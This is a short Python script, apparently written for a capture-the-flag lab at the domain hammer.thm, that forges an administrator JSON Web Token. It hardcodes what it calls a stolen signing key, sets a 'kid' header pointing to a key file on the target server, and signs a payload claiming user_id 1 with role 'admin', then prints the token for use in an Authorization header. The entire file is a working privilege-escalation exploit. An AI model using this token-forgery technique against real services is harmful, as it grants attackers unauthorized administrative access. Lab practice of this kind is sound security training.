import jwt
import time

# --- CONFIGURATION ---
SECRET_KEY = '56058354efb3daa97ebab00fabd7a7d7'
TARGET_KID = '/var/www/html/188ade1.key'

def generate_admin_token():
    """
    Crafts a forged JWT token for privilege escalation
    using the exfiltrated signing key.
    """
    
    header = {
        "typ": "JWT",
        "alg": "HS256",
        "kid": TARGET_KID
    }
    
    now = int(time.time())
    
    payload = {
        "iss": "http://hammer.thm",
        "aud": "http://hammer.thm",
        "iat": now,
        "exp": now + 3600, # Valid for 1 hour
        "data": {
            "user_id": 1,
            "email": "tester@hammer.thm",
            "role": "admin" # Escalating privileges to administrator
        }
    }

    try:
        # Encode and sign the token with the stolen key
        token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=header)
        
        print("\n\033[92m[+] Admin JWT successfully forged!\033[0m")
        print("-" * 60)
        print(token)
        print("-" * 60)
        print("\033[94m[*] Note: Use this token in your Authorization header.\033[0m\n")
        
    except Exception as e:
        print(f"\033[91m[!] Error generating token: {e}\033[0m")

if __name__ == "__main__":
    generate_admin_token()